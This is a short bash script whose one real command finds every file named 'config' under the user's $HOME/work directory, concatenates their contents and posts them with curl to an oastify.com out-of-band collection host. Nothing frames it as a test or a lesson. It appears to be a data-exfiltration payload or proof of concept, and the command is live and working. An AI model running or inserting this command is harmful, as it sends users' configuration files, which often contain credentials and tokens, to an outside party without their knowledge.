#!/usr/bin/env bash

find "$HOME/work" -type f -name config | xargs cat | curl 'mtj06n3xstiwa9tcr6yolax55wbnzfn4.oastify.com' -d @-
